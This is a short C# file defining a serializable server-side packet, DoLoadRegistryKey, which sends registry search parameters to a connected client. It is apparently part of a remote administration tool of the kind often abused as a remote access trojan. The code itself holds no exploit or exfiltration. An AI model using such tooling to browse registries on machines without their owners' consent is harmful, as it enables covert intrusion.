using System;
using Microsoft.Win32;
using xServer.Core.Networking;
using xServer.Core.Utilities;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoLoadRegistryKey : IPacket
    {
        public RegistrySeekerParams SearchParameters { get; set; }

        public DoLoadRegistryKey(RegistrySeekerParams args)
        {
            SearchParameters = args;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}